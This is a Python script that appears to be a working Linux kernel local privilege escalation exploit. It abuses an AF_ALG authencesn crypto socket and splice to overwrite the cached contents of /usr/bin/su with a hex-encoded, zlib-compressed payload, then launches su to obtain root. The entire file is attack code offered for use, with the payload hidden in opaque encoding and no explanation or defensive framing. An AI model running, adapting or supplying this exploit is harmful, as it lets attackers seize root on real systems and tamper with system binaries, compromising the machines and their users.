#!/usr/bin/env python3
import os
import zlib
import socket

PAYLOAD_COMPRESSED = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

def hex_to_bytes(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)

def exploit_step(fd: int, offset: int, data: bytes) -> None:
    """Executes a step of the exploit via cryptographic socket and splice."""
    sock = socket.socket(38, 5, 0)  # AF_ALG
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    ALG_SET_KEY = 279
    sock.setsockopt(ALG_SET_KEY, 1, hex_to_bytes('0800010000000010' + '0'*64))
    sock.setsockopt(ALG_SET_KEY, 5, None, 4)  # Trigger vulnerability
    
    conn, _ = sock.accept()
    
    zero_byte = hex_to_bytes('00')
    conn.sendmsg(
        [b"A" * 4 + data],
        [
            (ALG_SET_KEY, 3, zero_byte * 4),
            (ALG_SET_KEY, 2, b'\x10' + zero_byte * 19),
            (ALG_SET_KEY, 4, b'\x08' + zero_byte * 3),
        ],
        32768
    )
    
    read_pipe, write_pipe = os.pipe()
    os.splice(fd, write_pipe, offset + 4, offset_src=0)
    os.splice(read_pipe, conn.fileno(), offset + 4)
    
    try:
        conn.recv(8 + offset)  # Trigger kernel corruption
    except Exception:
        pass  

def main():
    # Open /usr/bin/su to corrupt
    su_fd = os.open("/usr/bin/su", os.O_RDONLY)
    
    # Decompress payload
    payload = zlib.decompress(hex_to_bytes(PAYLOAD_COMPRESSED))
    

    for i in range(0, len(payload), 4):
        exploit_step(su_fd, i, payload[i:i+4])
    
    os.system("su")

if __name__ == "__main__":
    main()